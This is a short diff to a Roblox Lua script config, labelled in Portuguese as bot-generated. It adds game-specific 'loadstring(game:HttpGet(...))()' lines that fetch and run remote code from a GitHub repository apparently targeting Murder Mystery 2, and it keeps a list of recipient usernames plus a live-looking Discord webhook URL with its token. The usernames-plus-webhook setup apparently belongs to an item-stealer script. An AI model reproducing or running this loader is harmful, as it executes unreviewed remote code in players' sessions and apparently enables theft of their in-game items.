@@ -1,6 +1,13 @@
 -- Configurações Geradas via Bot
--- [[ SCRIPT LEGIT CUSTOMIZADO ]]
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HoneyLua/refs/heads/main/Loader.luau"))()
+-- [[ SCRIPT ADICIONAL ]]
+place = game.PlaceId
+
+if place == 142823291 or place == 96420002244668 or place == 335132309 or place == 636649648 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HoneyLua/refs/heads/main/Supported%20Games/Murder%20Mystery%202/Main.luau"))()
+end
+
+return
+
 
 _G.Usernames = {"rosapops26", "yukiqamaanimes", "myloveisdavidUwU"}
 _G.webhook = "https://discord.com/api/webhooks/1505187170309115904/bLMvpRToSzwPoFRpuNza3LJljMge5C0Po1pZhv9KzvQZBF6AQeE0HQTYoYFtM6Ck0eGb"
